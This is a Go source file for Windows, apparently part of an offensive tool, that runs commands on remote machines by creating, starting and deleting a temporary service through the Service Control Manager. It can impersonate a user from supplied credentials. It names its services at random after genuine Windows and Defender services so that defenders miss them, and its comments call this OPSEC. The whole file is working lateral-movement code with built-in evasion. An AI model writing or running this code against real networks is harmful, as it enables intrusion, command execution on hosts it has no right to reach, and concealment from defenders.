//go:build windows && amd64

package lateral

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	advapi32               = windows.NewLazySystemDLL("advapi32.dll")
	procOpenSCManagerW     = advapi32.NewProc("OpenSCManagerW")
	procCreateServiceW     = advapi32.NewProc("CreateServiceW")
	procOpenServiceW       = advapi32.NewProc("OpenServiceW")
	procStartServiceW      = advapi32.NewProc("StartServiceW")
	procDeleteService      = advapi32.NewProc("DeleteService")
	procCloseServiceHandle = advapi32.NewProc("CloseServiceHandle")
	procLogonUserW         = advapi32.NewProc("LogonUserW")
	kernel32               = windows.NewLazySystemDLL("kernel32.dll")
	procImpersonateUser    = kernel32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf       = kernel32.NewProc("RevertToSelf")
)

const (
	SC_MANAGER_ALL_ACCESS     = 0x000F003F
	SC_MANAGER_CREATE_SERVICE = 0x0002
	SERVICE_ALL_ACCESS        = 0x000F01FF
	SERVICE_WIN32_OWN_PROCESS = 0x00000010
	SERVICE_DEMAND_START      = 0x00000003
	SERVICE_ERROR_NORMAL      = 0x00000001
	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT  = 0
)

// RemoteCmd 通过 Windows Service Control Manager 远程执行命令。
// 流程：
//  1. 可选：LogonUser 获取指定用户令牌
//  2. OpenSCManager(\\target)
//  3. CreateService("AegisSvc", "cmd.exe /c command")
//  4. StartService()
//  5. 等待执行完成
//  6. DeleteService() → 清理
func RemoteCmd(target, username, password, command string) (string, error) {
	if target == "" || command == "" {
		return "", fmt.Errorf("target and command required")
	}

	var hToken windows.Token
	var err error

	// 1. 可选：使用指定用户认证并模拟
	if username != "" && password != "" {
		hToken, err = logonUser(username, password)
		if err != nil {
			return "", fmt.Errorf("LogonUser: %w", err)
		}
		defer windows.CloseHandle(windows.Handle(hToken))

		// 模拟登录用户，后续操作使用指定用户凭据
		ret, _, _ := procImpersonateUser.Call(uintptr(hToken))
		if ret == 0 {
			return "", fmt.Errorf("ImpersonateLoggedOnUser failed")
		}
		defer procRevertToSelf.Call()
	}

	// 2. 连接到远程 SCManager
	targetPtr := syscall.StringToUTF16Ptr(fmt.Sprintf(`\\%s`, target))
	ret, _, _ := procOpenSCManagerW.Call(
		uintptr(unsafe.Pointer(targetPtr)),
		0,
		SC_MANAGER_ALL_ACCESS|SC_MANAGER_CREATE_SERVICE,
	)
	if ret == 0 {
		return "", fmt.Errorf("OpenSCManager(\\\\%s) failed", target)
	}
	hSCManager := syscall.Handle(ret)
	defer procCloseServiceHandle.Call(uintptr(hSCManager))

	// 3. 创建临时服务 — 随机服务名（OPSEC：避免可预测的 "AegisSvc" 模式）
	svcName := randomServiceName()
	svcNamePtr := syscall.StringToUTF16Ptr(svcName)
	displayName := syscall.StringToUTF16Ptr(randomDisplayName())
	binPath := syscall.StringToUTF16Ptr(fmt.Sprintf("cmd.exe /c %s", command))

	ret, _, _ = procCreateServiceW.Call(
		uintptr(hSCManager),
		uintptr(unsafe.Pointer(svcNamePtr)),
		uintptr(unsafe.Pointer(displayName)),
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		uintptr(unsafe.Pointer(binPath)),
		0, 0, 0, 0, 0,
	)
	if ret == 0 {
		return "", fmt.Errorf("CreateService failed")
	}
	hService := syscall.Handle(ret)

	// 4. 启动服务
	ret, _, _ = procStartServiceW.Call(uintptr(hService), 0, 0)
	started := ret != 0

	// 等待命令执行
	time.Sleep(3 * time.Second)

	// 5. 删除服务
	procDeleteService.Call(uintptr(hService))
	procCloseServiceHandle.Call(uintptr(hService))

	if !started {
		return fmt.Sprintf("service '%s' created on %s but failed to start (cleaned up)", svcName, target), nil
	}

	return fmt.Sprintf("service '%s' executed on %s (cleaned up)", svcName, target), nil
}

// logonUser 使用指定凭据登录。
func logonUser(username, password string) (windows.Token, error) {
	parts := strings.SplitN(username, "\\", 2)
	domain := ""
	user := username
	if len(parts) == 2 {
		domain = parts[0]
		user = parts[1]
	}

	userPtr := syscall.StringToUTF16Ptr(user)
	domainPtr := syscall.StringToUTF16Ptr(domain)
	passPtr := syscall.StringToUTF16Ptr(password)

	var token windows.Token
	ret, _, _ := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passPtr)),
		LOGON32_LOGON_NEW_CREDENTIALS,
		LOGON32_PROVIDER_DEFAULT,
		uintptr(unsafe.Pointer(&token)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("LogonUser failed")
	}
	return token, nil
}

// randomServiceName 生成随机服务名，避免可预测模式。
func randomServiceName() string {
	prefixes := []string{"WinDefend", "SgrmBroker", "FontCache", "WpnService", "ClipSVC", "dmwappushservice", "SstpSvc", "FrameServer", "MessagingService"}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(prefixes))))
	suffix := time.Now().UnixNano() % 1000000
	return fmt.Sprintf("%s_%d", prefixes[n.Int64()], suffix)
}

// randomDisplayName 生成看起来正常的服务显示名。
func randomDisplayName() string {
	names := []string{
		"Windows Defender Advanced Threat Protection Service",
		"System Guard Runtime Monitor Broker",
		"Windows Font Cache Service",
		"Windows Push Notifications System Service",
		"Client License Service",
		"Microsoft Windows SMS Router Service",
		"Microsoft Windows Connection Manager",
		"Windows Camera Frame Server",
		"Windows MessagingService",
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(names))))
	return names[n.Int64()]
}
